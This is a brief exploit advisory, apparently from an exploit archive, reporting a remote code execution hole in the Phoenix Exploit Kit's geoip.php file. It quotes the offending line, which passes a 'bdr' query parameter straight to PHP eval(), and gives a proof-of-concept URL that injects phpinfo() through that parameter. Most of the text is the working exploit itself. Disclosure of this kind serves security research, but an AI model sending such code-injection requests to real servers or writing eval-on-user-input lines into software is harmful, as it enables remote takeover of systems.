# Exploit Title: Phoenix Exploit Kit - Remote Code Execution
# Exploit Author: CrashBandicot @DosPerl
# Date: 2016-06-30
# Tested on: MSWin32
 
# Vuln file : geoip.php
 
492.  isset($_GET['bdr']) ? eval($_GET['bdr']) : explode('nop','nop nop nop');
 
# PoC : http://localhost/Phoenix/includes/geoip.php?bdr=phpinfo();

# Screen : http://i.imgur.com/E7RBBRk.png

__END__
